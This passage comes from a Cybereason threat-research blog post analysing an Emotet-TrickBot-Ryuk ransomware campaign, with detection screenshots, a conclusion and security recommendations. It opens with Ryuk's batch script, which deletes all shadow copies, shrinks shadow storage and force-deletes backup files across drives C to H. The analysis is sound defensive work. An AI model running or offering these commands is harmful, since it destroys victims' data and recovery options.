<pre>vssadmin Delete Shadows /all /quiet<br><br>vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB<br><br>vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded<br><br>vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB<br><br>vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded<br><br>vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB<br><br>vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded<br><br>vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB<br><br>vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded<br><br>vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB<br><br>vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded<br><br>vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB<br><br>vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded<br><br>vssadmin Delete Shadows /all /quiet<br><br>del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk<br><br>del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk<br><br>del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk<br><br>del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk<br><br>del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk<br><br>del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk<br><br>del %0</pre>
<p>&nbsp;The Cybereason Platform was able to raise an alert thanks to the suspicious behavior of the injected taskhost.&nbsp;</p>
<div><img src="https://lh4.googleusercontent.com/BgO9m8NwLNPFOTJazbijKFazr7-AzDa4vTDKWVBpF2nvrrNwqfWYlb8obM9nhU8WAFHRHNnjowucCCO7-a7Jew69U-ZYthBGNCUCeKF30NjafP17NCIqD3v_ZCGdc8OCI4uq2jYS" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center; line-height: 1;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-68.png?width=729&amp;name=triple-threat-blog-68.png" alt="triple-threat-blog-68" width="729" loading="lazy" style="width: 729px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-68.png?width=365&amp;name=triple-threat-blog-68.png 365w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-68.png?width=729&amp;name=triple-threat-blog-68.png 729w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-68.png?width=1094&amp;name=triple-threat-blog-68.png 1094w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-68.png?width=1458&amp;name=triple-threat-blog-68.png 1458w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-68.png?width=1823&amp;name=triple-threat-blog-68.png 1823w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-68.png?width=2187&amp;name=triple-threat-blog-68.png 2187w" sizes="(max-width: 729px) 100vw, 729px">&nbsp;</p>
<p style="text-align: center;"><em>An alert for ransomware in the Cybereason Platform.</em>&nbsp;</p>
<p>Ryuk encrypts files on the disk and changes the extension to .RYK.</p>
<div><img src="https://lh6.googleusercontent.com/HeMn4s31_RVolwwnnq04FyvnMfvCJRGMrsz-ndzkugLftIqxwmGtRDLsjC-N3CwPsY38SB7ix2cum0rTaPySP7WRbitEAarPwtK1fY1dTBvSJK1pgFV0y9YvRN_06syCniPIXH9E" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-69.png?width=299&amp;name=triple-threat-blog-69.png" alt="triple-threat-blog-69" width="299" loading="lazy" style="width: 299px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-69.png?width=150&amp;name=triple-threat-blog-69.png 150w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-69.png?width=299&amp;name=triple-threat-blog-69.png 299w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-69.png?width=449&amp;name=triple-threat-blog-69.png 449w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-69.png?width=598&amp;name=triple-threat-blog-69.png 598w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-69.png?width=748&amp;name=triple-threat-blog-69.png 748w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-69.png?width=897&amp;name=triple-threat-blog-69.png 897w" sizes="(max-width: 299px) 100vw, 299px"></em></p>
<p style="text-align: center;"><em>Ryuk changing the extensions of the files to .RYK.</em></p>
<p>Ryuk drops a ransom note RyukReadMe.txt created with notepad.exe in every processed folder.&nbsp;</p>
<div>&nbsp;<img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-70.png?width=405&amp;name=triple-threat-blog-70.png" alt="triple-threat-blog-70" width="405" loading="lazy" style="width: 405px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-70.png?width=203&amp;name=triple-threat-blog-70.png 203w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-70.png?width=405&amp;name=triple-threat-blog-70.png 405w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-70.png?width=608&amp;name=triple-threat-blog-70.png 608w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-70.png?width=810&amp;name=triple-threat-blog-70.png 810w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-70.png?width=1013&amp;name=triple-threat-blog-70.png 1013w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-70.png?width=1215&amp;name=triple-threat-blog-70.png 1215w" sizes="(max-width: 405px) 100vw, 405px"></div>
<p style="text-align: center;"><em>The creation of the ransom note. </em>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-71.png?width=1563&amp;name=triple-threat-blog-71.png" alt="triple-threat-blog-71" width="1563" loading="lazy" style="width: 1563px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-71.png?width=782&amp;name=triple-threat-blog-71.png 782w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-71.png?width=1563&amp;name=triple-threat-blog-71.png 1563w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-71.png?width=2345&amp;name=triple-threat-blog-71.png 2345w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-71.png?width=3126&amp;name=triple-threat-blog-71.png 3126w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-71.png?width=3908&amp;name=triple-threat-blog-71.png 3908w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-71.png?width=4689&amp;name=triple-threat-blog-71.png 4689w" sizes="(max-width: 1563px) 100vw, 1563px"><img src="https://lh5.googleusercontent.com/0S1U2IwmT3UwOvImm8j67Bcvs44CY0ykcWFHNEFp9Klyv-n0AZpKhhVV_YliVFab1i5g0ezVdMNehLvAbFtvPwPIHt5Ll1KsHmDW4UR7Ccd249KlSS7WOBqXVcJmCKr45REIkjux" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>The contents of the Ryuk ransom note. </em>&nbsp;</p>
<h2 style="line-height: 1.75;">Conclusion</h2>
<p>TrickBot is classified as a banking trojan, but the banking-related capability is just one of its many abilities. TrickBot is able to communicate with a C2 server as well as collect and exfiltrate sensitive data ranging from banking credentials, usernames and passwords, and personal data. An attacker with this information can easily destroy trust in a business, wreck the reputation of a brand, or compromise individuals and cost companies money.<br><br>Once Ryuk infects the machine, it starts to encrypt files and spreads through the network to infect more machines. This increases the damage and the likelihood that the victim will be willing to pay the ransom. This threat, due to its advanced capabilities and spreading ability, can cause a great deal of damage to an organization, from loss of money to brand degradation.</p>
<p>Our customers were able to use our <a href="/blog/cybereason-guided-remediation-a-tailored-approach-for-enhanced-incident-response" rel=" noopener">remediation tool</a> of the Cybereason Platform to immediately stop the exfiltration and prevent future execution of these kind of malicious files in the organization. Cybereason’s Active Monitoring team and Hunting team were able to detect both the malicious file related to TrickBot and the operations and modules used to perform its activity. This includes reconnaissance, credential harvesting and spreading using the PowerShell Empire framework, mimikatz, and EternalBlue. All of these activities work to distribute and deliver an additional payload, in this instance the Ryuk ransomware.</p>
<p>Reduce the costs in your SOC by applying the right roles to SIEM and EDR. <a href="/the-right-roles-for-siem-edr-soar-in-the-soc" rel="noopener" target="_blank">Read our white paper</a> to learn how.&nbsp;</p>
<h4 style="font-size: 30px; line-height: 1.75;">Research by Noa Pinkas, Lior Rochberger, and Matan Zatz</h4>
<p>Cybereason’s <a href="/services/active-monitoring" rel=" noopener">Active Monitoring</a> and <a href="/services/active-hunting" rel=" noopener">Hunting</a> teams have uncovered a severe threat that uses the Emotet trojan and the TrickBot trojan to deliver the Ryuk ransomware. During the past few weeks, the Cybereason Active Monitoring team has encountered multiple incidents of attempted TrickBot infection. Among these incidents and investigations, the team observed Ryuk ransomware infection attempts as well. The nature of Ryuk deployment and execution tactics, techniques, and procedures can vary across incidents. However, the Cybereason Active Monitoring team was able to identify that machines infected with TrickBot were susceptible to a future infection with Ryuk.</p>
<p>Though TrickBot is known as a banking trojan, in this campaign its banking capabilities are one of many abilities. In this instance, it is able to communicate with a C2 server to collect and exfiltrate a range of sensitive data. It is also able to deploy the Ryuk ransomware, which encrypts files throughout the network and increases the damage to the end user. These threats result in brand degradation, damage to an organization, and damage to the individual.</p>
<h2 style="line-height: 1.75;">Security Recommendations</h2>
<ul>
<li><span style="font-size: 18px;">Educate your team on how to correctly handle suspicious emails to prevent initial downloading or dropping of malware.</span></li>
<li><span style="font-size: 18px;">In order to protect against lateral movement, do not use privileged accounts, avoid RDPs without properly terminating the session, do not store passwords in plain text, deploy good authentication practices, disable unnecessary share folders, and change the names of the default share folders used in your organization.</span></li>
<li><span style="font-size: 18px;">Make sure you systems are patched, especially<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144" rel=" noopener"> CVE-2017-0144</a>, to prevent the propagation of TrickBot and other malware.</span></li>
<li><span style="font-size: 18px;"><a href="https://support.office.com/en-us/article/enable-or-disable-macros-in-office-files-12b036fd-d140-4e74-b45e-16fed1a7e5c6" rel=" noopener">Disable macros</a> across the environment.</span></li>
<li><span style="font-size: 18px;">Follow <a href="https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a" rel=" noopener">Microsoft’s security advisory update</a> on improving credentials protection and management in your organization.</span></li>
<li><span style="font-size: 18px;">Proactively approach security by performing hunts and searching for suspicious behavior before an incident starts.</span></li>
<li><span style="font-size: 18px;">Remove any persistence mechanisms that may have been used by any of the malware mentioned here in order to mitigate the threat.</span><br><br></li>
</ul>
<p>Worried about getting hit with an attack like this? Close the holes in your defense with MITRE ATT&amp;CK. Read our white paper to learn how.</p>
<p><!--HubSpot Call-to-Action Code --><span class="hs-cta-wrapper" id="hs-cta-wrapper-d8b5fccc-df9b-4621-86be-9d72ad635e7f"><span class="hs-cta-node hs-cta-d8b5fccc-df9b-4621-86be-9d72ad635e7f" id="hs-cta-d8b5fccc-df9b-4621-86be-9d72ad635e7f"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/3354902/d8b5fccc-df9b-4621-86be-9d72ad635e7f"><img class="hs-cta-img" id="hs-cta-img-d8b5fccc-df9b-4621-86be-9d72ad635e7f" style="border-width:0px;" src="https://no-cache.hubspot.com/cta/default/3354902/d8b5fccc-df9b-4621-86be-9d72ad635e7f.png" alt="Download&nbsp;the Five Stages to Create a Strategic, Closed-loop Security Process  with MITRE ATT&amp;CK white paper."></a></span><script charset="utf-8" src="/hs/cta/cta/current.js"></script><script type="text/javascript"> hbspt.cta._relativeUrls=true;hbspt.cta.load(3354902, 'd8b5fccc-df9b-4621-86be-9d72ad635e7f', {"useNewLoader":"true","region":"na1"}); </script></span><!-- end HubSpot Call-to-Action Code --></p></span>
          
          <!-- IOC PopUp Modal -->
          
          
          
          <!-- -->
          
          <!-- Social Share -->
          <div class="cr-blog-post__social-sharing">
            <span>Share</span>
            <div id="hs_cos_wrapper_module_161724375084957" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-social_sharing" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">






<div class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_social_sharing" data-hs-cos-general-type="widget" data-hs-cos-type="social_sharing">
  
	
  
    
    
    
			
		

    <a href="https://twitter.com/intent/tweet?original_referer=https://www.cybereason.com/blog/research/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware&amp;utm_medium=social&amp;utm_source=twitter&amp;url=https://www.cybereason.com/blog/research/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware&amp;utm_medium=social&amp;utm_source=twitter&amp;source=tweetbutton&amp;text=" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/twitter-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on twitter">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.facebook.com/share.php?u=https://www.cybereason.com/blog/research/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware&amp;utm_medium=social&amp;utm_source=facebook" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/facebook-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on facebook">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.cybereason.com/blog/research/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware&amp;utm_medium=social&amp;utm_source=linkedin" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/linkedin-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on linkedin">
    </a>
	

</div></div>
          </div> 
          
          
          <!-- CONDITIONAL Author Box Display -->
            <div class="container columns cr-mln__author-listing-single">
              
                <div class="column headshot is-3-full-hd is-3-desktop is-3-tablet is-12-mobile">
                  <img class="cr-speaker-headshot" src="https://www.cybereason.com/hubfs/CR_Owl_Web_Mono@3x%202.png" alt="Cybereason Nocturnus">
                </div>
              
              <div class="column is-9-full-hd is-9-desktop is-12-mobile">
                <span class="descriptor">About the Author</span>
                <h4>Cybereason Nocturnus</h4>
                
                  <a class="social" href="https://www.linkedin.com/company/cybereason" target="_blank">
                    <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-linkedin.png">
                  </a>
                
                
                  <a class="social" href="https://twitter.com/cr_nocturnus" target="_blank">
                    <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-twitter.svg">
                  </a>
                
                
                  <p>The Cybereason Nocturnus Team has brought the world’s brightest minds from the military, government intelligence, and enterprise security to uncover emerging threats across the globe. They specialize in analyzing new attack methodologies, reverse-engineering malware, and exposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.</p>
                
                
                  <a class="cr-button cr-button__min" href="https://www.cybereason.com/blog/authors/cybereason-nocturnus">All Posts by Cybereason Nocturnus</a>
                
              </div>            
            </div>
          
        <!-- CONDITIONAL Post Type Choices -->
        
        <!-- Malicious Life Post -->
        
        
        <!-- CISO Stories -->
        
        <!-- Webinar -->
        
          
        <!-- CONDITIONAL Transcript -->
          
        
         <!-- Related Posts -->
        <div id="hs_cos_wrapper_module_1649342860525315" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<section class="cr-section related-posts__wrapper">
  <div class="container container-is-blog page-center">
     <h3>Related Posts</h3>
     <div class="columns is-multiline">
       
  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware"><img src="https://www.cybereason.com/hubfs/Threat%20Alert%20template%20%284%29.png" alt="THREAT ANALYSIS REPORT: From Shathak Emails to the Conti Ransomware"></a>
    <h4><a href="https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware"><span class="underline">THREAT ANALYSIS REPORT: From Shathak Emails to the Conti Ransomware</span></a></h4>
     <p>The ITG23 group is partnering with the TA551 (Shatak) threat group to distribute ITG23’s TrickBot and BazarBackdoor malware which attackers use to deploy Conti ransomware on compromised systems...</p>
   </div>
 </div>


  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool"><img src="https://www.cybereason.com/hubfs/Threat%20Alert%20template%20%285%29.png" alt="THREAT ANALYSIS REPORT: Inside the LockBit Arsenal - The StealBit Exfiltration Tool"></a>
    <h4><a href="https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool"><span class="underline">THREAT ANALYSIS REPORT: Inside the LockBit Arsenal - The StealBit Exfiltration Tool</span></a></h4>
     <p>This report provides analysis on the evolution of configuration and implementation aspects of the StealBit malware developed by the LockBit ransomware group to exfiltrate sensitive data from targets for double extortion purposes…</p>
   </div>
 </div>



    </div>
  </div>
</section></div>
          
          
      </div>
        
        <!-- Sidebar -->

      <div class="column is-3-fullhd is-3-desktop is-12-mobile cr-malicious-life-network__sidebar">
        <div class="cr-ml-sidebar--group">
        <div class="top-stripe"></div>
        <div class="sidebar-block search-section">
          <form action="/hs-search-results">
            <input type="search" class="hs-search-field__input" name="term" autocomplete="on" placeholder="Search">
            <input type="hidden" name="type" value="BLOG_POST">
            <input type="hidden" name="type" value="LISTING_PAGE">
            <button type="submit" class="arrow"></button>
          </form>
        </div>
        <div class="sidebar-block subscribe">
          <a href="#blog-subscribe">
            <h4>Subscribe</h4>
            <span>Never miss a blog.</span>
          </a>
        </div>

        <div class="sidebar-block recent-posts">
          <h4>Recent Posts</h4>
          
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/malicious-life-podcast-operation-snow-white-part-2" class="post-name"><span class="underline">Malicious Life Podcast: Operation Snow White, Part 2</span></a>
                       
                    </div>
                </div>
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/threat-analysis-beast-ransomware" class="post-name"><span class="underline">THREAT ANALYSIS: Beast Ransomware</span></a>
                       
                    </div>
                </div>
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/cuckoo-spear-pt2-threat-actor-arsenal" class="post-name"><span class="underline">CUCKOO SPEAR Part 2: Threat Actor Arsenal</span></a>
                       
                    </div>
                </div>
            
        </div>

        <div class="sidebar-block category-listing">
          <h4>Categories</h4>
          <ul>
            <li><a href="https://www.cybereason.com/blog/category/research">Research</a></li>
            <li><a href="https://www.cybereason.com/blog/category/podcasts">Podcasts</a></li>
            <li><a href="https://www.cybereason.com/blog/category/webinars">Webinars</a></li>
            <li><a href="https://www.cybereason.com/blog/category/resources">Resources</a></li>
            <li><a href="https://www.cybereason.com/blog/category/videos">Videos</a></li>
            <li><a href="https://www.cybereason.com/blog/category/news">News</a></li>
          </ul>

          <a class="rec-category__single--view-all" href="/blog/category/research">All Posts</a>
        </div>

        
      </div><!-- END .rec-categories__all -->
      
      
      
    </div>
       
    </div>
  </div>
</div></div>

</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="display: none;" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1616011887658867" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<section class="cr-section related-posts__wrapper">
  <div class="container container-is-blog page-center">
     <h3>Related Posts</h3>
     <div class="columns is-multiline">
       
  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware"><img src="https://www.cybereason.com/hubfs/Threat%20Alert%20template%20%284%29.png" alt="THREAT ANALYSIS REPORT: From Shathak Emails to the Conti Ransomware"></a>
    <h4><a href="https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware"><span class="underline">THREAT ANALYSIS REPORT: From Shathak Emails to the Conti Ransomware</span></a></h4>
     <p>The ITG23 group is partnering with the TA551 (Shatak) threat group to distribute ITG23’s TrickBot and BazarBackdoor malware which attackers use to deploy Conti ransomware on compromised systems...</p>
   </div>
 </div>


  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool"><img src="https://www.cybereason.com/hubfs/Threat%20Alert%20template%20%285%29.png" alt="THREAT ANALYSIS REPORT: Inside the LockBit Arsenal - The StealBit Exfiltration Tool"></a>
    <h4><a href="https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool"><span class="underline">THREAT ANALYSIS REPORT: Inside the LockBit Arsenal - The StealBit Exfiltration Tool</span></a></h4>
     <p>This report provides analysis on the evolution of configuration and implementation aspects of the StealBit malware developed by the LockBit ransomware group to exfiltrate sensitive data from targets for double extortion purposes…</p>
   </div>
 </div>



    </div>
  </div>
</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-3 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_161767462015235" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-blog_subscribe" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="cr-mln__blog-listing-page__subscribe-footer">
  <div class="container container-is-blog columns page-center">
    <div class="column is-8-fullhd is-8-desktop is-10-tablet is-12-mobile">
      <span class="tag">NEWSLETTER</span>
      <h3>Never miss a blog</h3>
      <p>Get the latest research, expert insights, and security industry news.</p>
      <a class="cr-button cr-mln__subscribe" href="#blog-subscribe">Subscribe</a>
    </div>
    <!--<div class="column is-5-fullhd is-5-desktop is-half-tablet is-12-mobile is-offset-1-fullhd is-offset-1-desktop">
      <div class="inputs-wrapper">
        
        
      </div>
    </div>-->
  </div>
</div></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-4 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_166508001252918" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="cr-sticky-cta-bar bg-black" id="sticky-bar">
  <div class="content">
    <span>Want to see the Cybereason Defense Platform in action?</span>
    <a class="cr-button cr-button__fill-yellow" href="https://www.cybereason.com/request-a-demo" target="_blank">Schedule a Demo</a>
  </div>
  <div class="close">X</div>
</div></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end body -->
</div><!--end body wrapper -->

<div class="footer-container-wrapper">
    <div class="footer-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_16036762394194314" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><!-- FOOTER -->

<footer class="cr-section cr-footer cr-footer__full">
    <div class="container page-center">
      <div class="columns">
          <div class="column is-6-fullhd is-5-desktop cr-footer__col cr-footer__left">
            <div class="cr-footer__Left-logo">
              
                <a href="https://www.cybereason.com">
                  
                <img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-logo-inline--primary-white.png">
              </a>
            </div>
          </div>
          <div class="columns column is-6-fullhd is-6-desktop cr-footer__col cr-footer__right">
            <div class="cr-footer__links-list column">
              <h4>About</h4>
              <ul>
                <li><a href="https://www.cybereason.com/company/who-we-are">Who We Are</a>
                </li><li><a href="https://www.cybereason.com/company/careers">Careers</a>
          <!-- </li><li><a href="https://www.cybereason.com/company/leadership">Leadership</a> --->
                </li><li><a href="https://www.cybereason.com/company/contact-us">Contact</a>
              </li></ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Resources</h4>
              <ul>
                <li><a href="https://www.cybereason.com/blog">Blog</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/case-study">Case Studies</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/webinars">Webinars</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/white-papers">White Papers</a></li>
             </ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Platform</h4>
              <ul>
                
                <li><a href="https://www.cybereason.com/platform">Overview</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-prevention">Endpoint Protection</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-detection-response-edr">EDR</a></li>
                <li><a href="https://www.cybereason.com/platform/managed-detection-response-mdr">MDR</a></li>
              </ul>
            </div>
          </div>
      </div>
    </div>
  
    <div class="container page-center">
      <div class="columns cr-footer__bottom-bar">
        <div class="column">
          <p>©Cybereason 2024. All Rights Reserved.</p>
        </div>
        <div class="column bottom-bar__links">
          <ul>
            <li><a href="https://www.cybereason.com/terms-of-use">Terms of Use</a></li>
            <li><a href="https://www.cybereason.com/privacy-notice">Privacy Notice</a></li>
            <li><a href="https://www.cybereason.com/ccpa-privacy-request">Do Not Sell</a></li>
            <li><a href="https://www.cybereason.com/security">Security</a></li>
            <!--<li><a href="#">Cookie Policy</a></li>-->
          </ul>
        </div>

        <div class="column bottom-bar__social">
          <ul>
            <li><a class="facebook" href="https://www.facebook.com/Cybereason/"></a></li>
            <li><a class="twitter" href="https://twitter.com/cybereason"></a></li>
            <li><a class="youtube" href="https://www.youtube.com/channel/UCOm7AaB0HiNH4Phe66sK0Ew"></a></li>
            <li><a class="linkedin" href="https://www.linkedin.com/company/cybereason"></a></li>
            <li><a class="instagram" href="https://www.instagram.com/cybereason"></a></li>
          </ul>
        </div>
    </div>
  </div>

</footer></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end footer -->
</div><!--end footer wrapper -->

    
<!-- HubSpot performance collection script -->
<script defer src="https://static.hsappstatic.net/content-cwv-embed/static-1.1293/embed.js"></script>
<script src="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/42507089303/1644440411417/__CR_Web_Platform/JS/animatedModal/animatedModal.min.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/41681847227/1644941386128/module_41681847227_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.js"></script>
<script src="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/41682410610/1644941443113/module_41682410610_CR_-_Malicious_Life_Network_--_Main_Hero.min.js"></script>
<script src="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/43300360745/1724042213858/module_43300360745_CR_-_Malicious_Life_Network_--_Related_Posts.min.js"></script>
